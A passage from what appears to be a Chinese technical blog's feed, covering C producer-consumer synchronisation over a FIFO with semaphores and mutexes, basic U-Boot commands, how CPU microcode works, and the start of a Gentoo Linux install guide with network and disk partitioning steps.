class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;strings.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fifo <span class="string">&quot;/tmp/myfifo&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> string <span class="string">&quot;myhelloworld&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd = <span class="number">0</span>;</span><br><span class="line"><span class="type">sem_t</span> full, avail, mutex;<span class="comment">//初始化三个全局信号量</span></span><br><span class="line"><span class="comment">//生产者线程函数</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">producer</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    sem_wait(&amp;avail);</span><br><span class="line">    sem_wait(&amp;mutex);</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> stringlen = <span class="built_in">strlen</span>(<span class="built_in">string</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//action</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">5</span>) &#123;</span><br><span class="line">        ret = write(fd, <span class="built_in">string</span>, stringlen);</span><br><span class="line">        <span class="keyword">if</span> (ret != stringlen) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;write string to fifo file error!\n&quot;</span>);</span><br><span class="line">            pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nwrite string to fifo file successful!\n&quot;</span>);</span><br><span class="line">        sem_post(&amp;full);</span><br><span class="line">        sem_post(&amp;mutex);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//消费者线程函数</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">consumer</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    sem_wait(&amp;full);</span><br><span class="line">    sem_wait(&amp;mutex);</span><br><span class="line">    <span class="comment">//action</span></span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> stringlen = <span class="built_in">strlen</span>(<span class="built_in">string</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> buffer[stringlen];</span><br><span class="line">    bzero(buffer, stringlen);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">5</span>) &#123;</span><br><span class="line">        ret = read(fd, buffer, stringlen);</span><br><span class="line">        <span class="keyword">if</span> (ret != stringlen) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;read string from fifo file error!\n&quot;</span>);</span><br><span class="line">            pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;read string from fifo:%s\n&quot;</span>, buffer);</span><br><span class="line">        bzero(buffer, stringlen);</span><br><span class="line">        i++;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        sem_post(&amp;avail);</span><br><span class="line">        sem_post(&amp;mutex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="keyword">if</span> (F_OK == access(fifo, <span class="number">0</span>)) &#123;</span><br><span class="line">        unlink(fifo);</span><br><span class="line">    &#125;</span><br><span class="line">    ret = mkfifo(fifo, <span class="number">0666</span>);</span><br><span class="line">    fd = open(fifo, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;mkfifo&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ret = sem_init(&amp;full, <span class="number">0</span>, <span class="number">0</span>) + sem_init(&amp;avail, <span class="number">0</span>, <span class="number">1</span>) + sem_init(&amp;mutex, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;semphore init failed!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">pthread_t</span> threadid[<span class="number">2</span>];</span><br><span class="line">    <span class="comment">//创建两个线程</span></span><br><span class="line">    <span class="keyword">if</span> (pthread_create(&amp;threadid[<span class="number">0</span>], <span class="literal">NULL</span>, producer, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;create thread failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pthread_create(&amp;threadid[<span class="number">1</span>], <span class="literal">NULL</span>, consumer, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;create thread failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//等待两个线程结束</span></span><br><span class="line">    pthread_join(threadid[<span class="number">0</span>], <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(threadid[<span class="number">1</span>], <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-使用线程互斥锁实现线程同步"><a href="#2-使用线程互斥锁实现线程同步" class="headerlink" title="2.使用线程互斥锁实现线程同步"></a>2.使用线程互斥锁实现线程同步</h3><h4 id="使用的api-1"><a href="#使用的api-1" class="headerlink" title="使用的api"></a>使用的api</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pthread_mutex_t</span> <span class="comment">//线程互斥锁类型</span></span><br><span class="line">pthread_mutex_lock(<span class="type">pthread_mutex_t</span> *mutex); <span class="comment">//获取互斥锁</span></span><br><span class="line">pthread_mutex_unlock(<span class="type">pthread_mutex_t</span> *mutex);<span class="comment">//释放互斥锁</span></span><br></pre></td></tr></table></figure><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;strings.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="comment">//定义两个宏,一个用于表示fifo文件的路径,一个用于定义一个字符串常量</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fifo <span class="string">&quot;/tmp/myfifo&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> string <span class="string">&quot;myhelloworld&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生产者线程函数</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">p_operation</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> stringlen = <span class="built_in">strlen</span>(<span class="built_in">string</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//action</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="comment">//获得线程锁</span></span><br><span class="line">        pthread_mutex_lock(&amp;mutex);</span><br><span class="line">        ret = write(fd, <span class="built_in">string</span>, stringlen);</span><br><span class="line">        <span class="keyword">if</span> (ret != stringlen) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;write string to fifo file error!\n&quot;</span>);</span><br><span class="line">            pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;write string to fifo file successful!\n&quot;</span>);</span><br><span class="line"><span class="comment">//释放线程锁</span></span><br><span class="line">        pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//消费则线程函数</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">v_operation</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="comment">//action</span></span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> stringlen = <span class="built_in">strlen</span>(<span class="built_in">string</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> buffer[stringlen];</span><br><span class="line">    bzero(buffer, stringlen);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">5</span>) &#123;</span><br><span class="line">        pthread_mutex_lock(&amp;mutex);</span><br><span class="line">        <span class="comment">//获得线程互斥锁</span></span><br><span class="line">        ret = read(fd, buffer, stringlen);</span><br><span class="line">        <span class="keyword">if</span> (ret == stringlen) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;read string from fifo:%s\n&quot;</span>, buffer);</span><br><span class="line">            bzero(buffer, stringlen);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">        <span class="comment">//释放线程互斥锁</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="keyword">if</span> (F_OK == access(fifo, <span class="number">0</span>)) &#123;</span><br><span class="line">        unlink(fifo);</span><br><span class="line">    &#125;</span><br><span class="line">    ret = mkfifo(fifo, <span class="number">0666</span>);</span><br><span class="line">    fd = open(fifo, O_RDWR);</span><br><span class="line">    <span class="comment">//将文件描述符设为非阻塞，防止出现死锁(如果没有设置非阻塞,可能会出现一个线程等待数据的到来,而另一个线程在等待线程锁的释放,造成死锁)</span></span><br><span class="line">    <span class="type">int</span> flag = fcntl(fd, F_GETFL);</span><br><span class="line">    fcntl(fd, F_SETFL, flag | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;mkfifo&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_mutex_init(&amp;mutex, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">pthread_t</span> threadid[<span class="number">2</span>];</span><br><span class="line">    <span class="comment">//创建两个线程</span></span><br><span class="line">    <span class="keyword">if</span> (pthread_create(&amp;threadid[<span class="number">0</span>], <span class="literal">NULL</span>, p_operation, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;create thread failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pthread_create(&amp;threadid[<span class="number">1</span>], <span class="literal">NULL</span>, v_operation, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;create thread failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//等待两个线程结束</span></span><br><span class="line">    pthread_join(threadid[<span class="number">0</span>], <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(threadid[<span class="number">1</span>], <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//销毁线程锁</span></span><br><span class="line">    pthread_mutex_destroy(&amp;mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 嵌入式应用开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>uboot基本命令</title>
      <link href="/2022/04/11/uboot%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/04/11/uboot%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="uboot基本命令"><a href="#uboot基本命令" class="headerlink" title="uboot基本命令"></a>uboot基本命令</h1><h2 id="什么是uboot？"><a href="#什么是uboot？" class="headerlink" title="什么是uboot？"></a>什么是uboot？</h2><p>uboot一个嵌入式领域常用的一种bootloader,支持多种计算机架构,如ARM,PPC,MIPS,</p><h2 id="为什么用uboot"><a href="#为什么用uboot" class="headerlink" title="为什么用uboot?"></a>为什么用uboot?</h2><ul><li>1.开放源码</li><li>2.支持多种嵌入式操作系统内核，如Linux、NetBSD, VxWorks, QNX, RTEMS, ARTOS, LynxOS, android</li><li>3.支持多个处理器系列，如PowerPC、ARM、x86、MIPS</li><li>4.较高的可靠性和稳定性</li><li>5.高度灵活的功能设置,适合U-Boot调试、操作系统不同引导要求、产品发布等</li><li>6.丰富的设备驱动源码，如串口、以太网、SDRAM、FLASH、LCD、NVRAM、EEPROM、RTC、键盘等</li><li>7.较为丰富的开发调试文档与强大的网络技术支持</li></ul><h2 id="uboot常用命令"><a href="#uboot常用命令" class="headerlink" title="uboot常用命令"></a>uboot常用命令</h2><h4 id="1-修改或查看内存命令"><a href="#1-修改或查看内存命令" class="headerlink" title="1.修改或查看内存命令"></a>1.修改或查看内存命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.md[.b,.w,.l] address count(查看内存中的数据)</span><br><span class="line">2.nm[.b,.w,.l] address(修改内存中的值)</span><br><span class="line">3.mm[.b,.w,.l] address(修改内存中的值,并且他会自增,输入q会退出)</span><br><span class="line">4.mw[.b,.w,.l] address value [count](修改内存中的值)</span><br><span class="line">5.<span class="built_in">cp</span>[.b,.w,.l] srcaddress value [count](拷贝内存中的值)</span><br><span class="line">6.cmp[.b,.w,.l] addr1 addr2 count(对比两块内存中的值)</span><br></pre></td></tr></table></figure><h4 id="2-读取命令"><a href="#2-读取命令" class="headerlink" title="2.读取命令"></a>2.读取命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.fatinfo &lt;interface&gt; dev:part (显示分区(fat)信息)</span><br><span class="line">2.fatls &lt;interface&gt; dev:part directory(列出某个目录的文件或者是目录)</span><br><span class="line">3.fatload &lt;interface&gt; address dev:part file (将一个文件从磁盘分区读取到内存)</span><br><span class="line">以上命令都是针对于fat文件系统分区的操作</span><br></pre></td></tr></table></figure><h4 id="3-设置环境变量"><a href="#3-设置环境变量" class="headerlink" title="3.设置环境变量"></a>3.设置环境变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printenv</span>(显示当前环境变量)</span><br><span class="line">setenv name value(设置环境变量)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件配置和使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是microcode?</title>
      <link href="/2022/04/10/%E4%BB%80%E4%B9%88%E6%98%AFmicrocode/"/>
      <url>/2022/04/10/%E4%BB%80%E4%B9%88%E6%98%AFmicrocode/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是microcode"><a href="#什么是microcode" class="headerlink" title="什么是microcode?"></a>什么是microcode?</h1><h4 id="cpu执行指令的步骤一般为"><a href="#cpu执行指令的步骤一般为" class="headerlink" title="cpu执行指令的步骤一般为"></a>cpu执行指令的步骤一般为</h4><ul><li>1.取指令</li><li>2.指令译码</li><li>3.指令执行</li><li>4.结果写回</li></ul><p>由上述步骤我们知道,cpu在执行二进制代码的时候需要对指令进行译码才能够执行  </p><h3 id="cpu译码的开始"><a href="#cpu译码的开始" class="headerlink" title="cpu译码的开始"></a>cpu译码的开始</h3><p>在译码开始时,程序的指令和数据分别会放到一级指令缓存(L1 cache),和数据一级缓存中,(只有L1 cache才是唯一指令和数据单独分割的cache),然后指令一级缓存中的指令会进入解码器,然后才是指令执行的开始</p><h3 id="cpu如何认识并指令指令"><a href="#cpu如何认识并指令指令" class="headerlink" title="cpu如何认识并指令指令"></a>cpu如何认识并指令指令</h3><h4 id="cpu译码器-Instuction-Decode-Unit-IDU"><a href="#cpu译码器-Instuction-Decode-Unit-IDU" class="headerlink" title="cpu译码器(Instuction Decode Unit(IDU))"></a>cpu译码器(Instuction Decode Unit(IDU))</h4><p>cpu译码器一般分为两种</p><ul><li>1.硬件指令译码器</li><li>2.微码指令译码器</li></ul><p>现在我们使用的计算机一般是X86架构,属于CISC(复杂指令集),指令种类繁多,如果所有的解码都通过硬件来完成,将会大幅增加硬件布线的难度,因此一般cpu在设计的时候一般只会对一些少量基本的指令采用硬件解码的方式,而一些复杂的指令采用微码指令译码器将其拆解为多条精简指令(microcode),因此cpu只有microcode才是基本的执行单位,硬件解码完成后,将会被cpu调度器(scheduler)放入pipeline提高指令的并行性</p><h3 id="microcode如何修复"><a href="#microcode如何修复" class="headerlink" title="microcode如何修复?"></a>microcode如何修复?</h3><p>我们知道,一条复杂指令要通过microcode译码器分解为多条microcode才能够被cpu所执行,原始的microcode来自于一块rom,为了microcode,新设计了一块较小的SRAM,用来为该rom上的microcode打补丁Microcode更新通常通过更新BIOS来更新</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gentoolinux安装步骤</title>
      <link href="/2022/04/10/Gentoolinux%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/"/>
      <url>/2022/04/10/Gentoolinux%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="Gentoolinux安装步骤-systemd"><a href="#Gentoolinux安装步骤-systemd" class="headerlink" title="Gentoolinux安装步骤(systemd)"></a>Gentoolinux安装步骤(systemd)</h1><h4 id="1-基本文件的获取"><a href="#1-基本文件的获取" class="headerlink" title="1.基本文件的获取"></a>1.基本文件的获取</h4><ul><li>1.获取livecd<br>livecd可以使用Gentoo官方提供的livecd或者其他linux distribution</li><li>2.获取stage<br>stage3分为两种,一种是以systemd作为init程序,一种是以openrc做为init程序(Gentoo官方是推荐openrc)</li></ul><h4 id="2-网络连接"><a href="#2-网络连接" class="headerlink" title="2.网络连接"></a>2.网络连接</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ethernet </span></span><br><span class="line"><span class="comment">#配置ip地址</span></span><br><span class="line">ip addr <span class="variable">$ipaddress</span>/netmask dev interface</span><br><span class="line"><span class="comment">#配置路由</span></span><br><span class="line">ip route add default via ipaddress</span><br><span class="line"><span class="comment">#wifi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#扫描wifi</span></span><br><span class="line">iwlist wlan0 scan</span><br><span class="line"></span><br><span class="line"><span class="comment">#连接wifi</span></span><br><span class="line">wpa_passpharse SSID password &gt; wifi.conf</span><br><span class="line">wpa_supplicant -c wifi.conf -B -i wlan0<span class="comment">#wlan为无线网卡名称,自行根据自己的网卡型号进行改动</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取ip地址</span></span><br><span class="line">dhcpcd wlan0</span><br></pre></td></tr></table></figure><h4 id="3-磁盘分区"><a href="#3-磁盘分区" class="headerlink" title="3.磁盘分区"></a>3.磁盘分区</h4><p>这里使用fdisk工具对磁盘进行分区,同样的也可以使用cfdisk或者其他磁盘分区工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk /dev/sda</span><br></pre></td></tr></table></figure><p>查看当前磁盘分区</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>):p</span><br><span class="line"></span><br><span class="line">Disk /dev/sda: 28.89 GiB, 31001149440 bytes, 60549120 sectors</span><br><span class="line">Disk model: DataTraveler 2.0</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: gpt</span><br><span class="line">Disk identifier: 21AAD8CF-DB67-0F43-9374-416C7A4E31EA</span><br><span class="line"> </span><br><span class="line">Device        Start      End  Sectors  Size Type</span><br><span class="line">/dev/sda1      2048   526335   524288  256M EFI System</span><br><span class="line">/dev/sda2    526336  2623487  2097152    1G Linux swap</span><br><span class="line">/dev/sda3   2623488 19400703 16777216    8G Linux filesystem</span><br><span class="line">/dev/sda4  19400704 60549086 41148383 19.6G Linux filesystem</span><br></pre></td></tr></table></figure><p>创建一个gpt分区列表</p><figure class="highlight 